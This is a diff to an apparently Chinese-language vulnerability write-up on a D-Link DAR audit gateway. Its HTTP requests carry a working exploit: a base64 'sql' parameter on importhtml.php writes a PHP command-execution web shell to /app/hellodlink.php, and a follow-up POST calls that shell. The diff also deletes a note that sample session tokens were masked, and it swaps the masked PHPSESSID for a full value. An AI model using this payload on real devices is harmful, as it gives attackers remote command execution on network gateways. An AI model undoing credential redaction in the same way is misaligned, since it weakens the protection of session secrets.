@@ -38,7 +38,6 @@ source_status: "recorded"
 - 无SQL/脚本执行响应，权限和具体型号固件缺失
 - payload十六进制为双引号cmd而解释单引号，语义等价可规范但非根因错误
 - 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值；标题与正文证据对齐。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -69,7 +68,7 @@ D-Link DAR上网行为审计网关可以为企业提供完善的互联网访问�
 ```http
 GET /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvaGVsbG9kbGluay5waHAn HTTP/1.1
 Host: xx.xx.xx.xx
-Cookie: PHPSESSID=8d3**************************6e7
+Cookie: PHPSESSID=8d3887c7a401d2f1bc1a58631fcfa6e7
 Accept: text/html, application/xhtml+xml, image/jxr, */*
 Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
@@ -91,7 +90,7 @@ Connection: close
 ```http
 POST /app/hellodlink.php HTTP/1.1
 Host: xx.xx.xx.xx
-Cookie: PHPSESSID=8d3**************************6e7
+Cookie: PHPSESSID=8d3887c7a401d2f1bc1a58631fcfa6e7
 Accept: text/html, application/xhtml+xml, image/jxr, */*
 Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
